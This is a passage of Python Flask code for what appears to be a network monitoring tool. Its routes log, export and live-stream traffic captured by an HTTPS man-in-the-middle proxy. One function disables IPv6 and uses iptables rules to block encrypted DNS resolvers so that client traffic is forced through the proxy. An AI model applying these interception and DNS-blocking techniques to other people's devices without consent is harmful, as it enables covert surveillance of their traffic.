        - method: HTTP method (requests only)
        - path: Request path (requests only)
        - status: HTTP status code (responses only)
        - bytes: Response size in bytes
    """
    global HTTPS_PROXY

    if not HTTPS_PROXY:
        return jsonify({'success': False, 'error': 'HTTPS proxy not initialized', 'entries': []})

    try:
        limit = min(int(request.args.get('limit', 100)), 1000)
    except ValueError:
        limit = 100

    hostname_filter = request.args.get('hostname_filter', '').lower()
    method_filter = request.args.get('method_filter', '').upper()
    status_filter = request.args.get('status_filter', '')

    entries = HTTPS_PROXY.get_traffic_log(limit=limit*2)  # Get extra to filter

    # Apply filters
    filtered = []
    for entry in entries:
        if hostname_filter and hostname_filter not in entry.get('hostname', '').lower():
            continue
        if method_filter and entry.get('method', '') != method_filter:
            continue
        if status_filter and str(entry.get('status', '')) != status_filter:
            continue
        filtered.append(entry)

    # Return most recent entries up to limit
    return jsonify({
        'success': True,
        'count': len(filtered),
        'entries': filtered[:limit],
        'proxy_running': HTTPS_PROXY.running
    })

@app.route('/api/https_traffic/export', methods=['GET'])
@require_auth
def api_https_traffic_export():
    """Export HTTPS traffic to CSV or JSON format (Phase 5D).

    Query parameters:
    - format: 'csv' or 'json' (default: 'json')
    - hostname_filter: Filter by hostname
    - client_ip_filter: Filter by client IP

    Returns:
        File download or JSON error response
    """
    if not TRAFFIC_DATABASE:
        return jsonify({'success': False, 'error': 'Traffic database not initialized'}), 500

    export_format = request.args.get('format', 'json').lower()
    hostname_filter = request.args.get('hostname_filter', '')
    client_ip_filter = request.args.get('client_ip_filter', '')

    if export_format not in ['csv', 'json']:
        return jsonify({'success': False, 'error': 'Format must be csv or json'}), 400

    try:
        if export_format == 'csv':
            filepath = TRAFFIC_DATABASE.export_csv(
                hostname_filter=hostname_filter if hostname_filter else None,
                client_ip_filter=client_ip_filter if client_ip_filter else None
            )
            if filepath and os.path.exists(filepath):
                return send_file(filepath, as_attachment=True, download_name=os.path.basename(filepath))
        else:
            filepath = TRAFFIC_DATABASE.export_json(
                hostname_filter=hostname_filter if hostname_filter else None,
                client_ip_filter=client_ip_filter if client_ip_filter else None
            )
            if filepath and os.path.exists(filepath):
                return send_file(filepath, as_attachment=True, download_name=os.path.basename(filepath))

        return jsonify({'success': False, 'error': 'Export failed'}), 500
    except Exception as e:
        add_log('error', f'Traffic export failed: {e}')
        return jsonify({'success': False, 'error': str(e)}), 500

@app.route('/api/https_traffic/stream', methods=['GET'])
@require_auth
def api_https_traffic_stream():
    """Server-Sent Events (SSE) stream for live HTTPS traffic (Phase 1.5).

    Streams new traffic entries in real-time as they're logged by the MITM proxy.
    Client connects and receives JSON objects for each new request/response.

    Keeps connection open and pushes events as proxy logs traffic.
    Browser automatically reconnects on disconnect.

    Usage (JavaScript):
        const eventSource = new EventSource('/api/https_traffic/stream');
        eventSource.onmessage = (event) => {
            const entry = JSON.parse(event.data);
            // Update UI with new traffic entry
        };
    """
    global HTTPS_PROXY

    if not HTTPS_PROXY:
        return Response('data: {"error": "HTTPS proxy not initialized"}\n\n', mimetype='text/event-stream')

    def generate():
        """Generator function that yields SSE events for new traffic entries."""
        last_index = len(HTTPS_PROXY.traffic_log)

        while True:
            try:
                # Check for new entries
                current_log = HTTPS_PROXY.get_traffic_log(limit=1000)
                current_index = len(HTTPS_PROXY.traffic_log)

                # Send any new entries since last check
                if current_index > last_index:
                    new_entries = current_log[-(current_index - last_index):]
                    for entry in new_entries:
                        yield f"data: {json.dumps(entry)}\n\n"
                    last_index = current_index

                # Sleep briefly to avoid busy loop
                time.sleep(0.5)

            except GeneratorExit:
                break
            except Exception as e:
                add_log('error', f'SSE stream error: {e}')
                yield f"data: {json.dumps({'error': str(e)})}\n\n"
                break

    return Response(generate(), mimetype='text/event-stream')

# ---------- IPv6 & DoH Mitigation ----------
def mitigate_ipv6_doh(iface):
    """Disable IPv6 and block DoH servers to force traffic through proxy.

    Modern Android defaults to IPv6 for DNS queries and apps hardcode DoH servers
    (1.1.1.1:443, 8.8.8.8:443). Without this mitigation, 30-40% of traffic bypasses
    the plaintext DNS proxy entirely, leaving the tool blind to modern app behavior.

    Mitigations applied:
    1. Disable IPv6 on interface via sysctl (forces IPv4-only DNS stack)
    2. Block well-known DoH servers via iptables (forces fallback to port 53)

    Gracefully handles missing tools (sysctl, iptables) with informative logging.
    Non-fatal: tool still works without these, just with reduced traffic coverage.
    """
    ipv6_success = False
    doh_success = False

    # 1. Attempt IPv6 disable via sysctl
    try:
        result = subprocess.run(
            ['sysctl', '-w', f'net.ipv6.conf.{iface}.disable_ipv6=1'],
            capture_output=True, text=True, timeout=5
        )
        if result.returncode == 0:
            add_log('success', f'IPv6 disabled on {iface} (via sysctl)')
            ipv6_success = True
        else:
            add_log('warn', f'sysctl returned {result.returncode} for IPv6 disable: {result.stderr.strip()}')
    except FileNotFoundError:
        add_log('warn', f'sysctl not found; IPv6 disable skipped (install with: pkg install util-linux)')
    except subprocess.TimeoutExpired:
        add_log('warn', f'sysctl timed out disabling IPv6 on {iface}')
    except Exception as e:
        add_log('warn', f'Failed to disable IPv6 on {iface}: {type(e).__name__}: {str(e)[:100]}')

    # 2. Attempt DoH server blocking via iptables
    try:
        subprocess.run(['iptables', '--version'], capture_output=True, timeout=2)
    except FileNotFoundError:
        add_log('warn', f'iptables not found; DoH blocking skipped (install with: pkg install iptables)')
        return

    # iptables exists; proceed to block DoH servers
    doh_servers = [
        ('1.1.1.1', 'Cloudflare'),
        ('1.0.0.1', 'Cloudflare secondary'),
        ('8.8.8.8', 'Google'),
        ('8.8.4.4', 'Google secondary'),
        ('9.9.9.9', 'Quad9'),
        ('149.112.112.112', 'Quad9 secondary'),
    ]

    blocked_count = 0
    for ip, label in doh_servers:
        try:
            # Block HTTPS (443) to this DoH server
            subprocess.run(
                ['iptables', '-t', 'filter', '-A', 'OUTPUT', '-d', ip, '-p', 'tcp', '--dport', '443', '-j', 'DROP'],
                capture_output=True, timeout=3, check=False
            )
            # Block DNS-over-TLS (853)
            subprocess.run(
                ['iptables', '-t', 'filter', '-A', 'OUTPUT', '-d', ip, '-p', 'tcp', '--dport', '853', '-j', 'DROP'],
                capture_output=True, timeout=3, check=False
            )
            blocked_count += 1
            add_log('dev', f'Blocked DoH {label} ({ip}:443/853)')
        except subprocess.TimeoutExpired:
            add_log('warn', f'iptables rule for {ip} timed out')
        except Exception as e:
            add_log('warn', f'Failed to block {ip}: {type(e).__name__}')

    if blocked_count > 0:
        add_log('success', f'DoH servers blocked: {blocked_count}/{len(doh_servers)} rules installed')
        doh_success = True

    if not (ipv6_success or doh_success):
        add_log('warn', f'IPv6/DoH mitigation partially failed; traffic coverage may be reduced on {iface}')

# ---------- bootstrap ----------
if __name__ == '__main__':
    if os.geteuid() != 0:
        print("WARNING: Not running as root. Some features (raw sockets, iptables) may fail.")
    ensure_tool('iw')
    ensure_tool('iptables')
    ddns_bootstrap_from_env()
    threading.Thread(target=ddns_supervisor_loop, daemon=True).start()
    app.run(host='0.0.0.0', port=APP_PORT, debug=False, threaded=True)
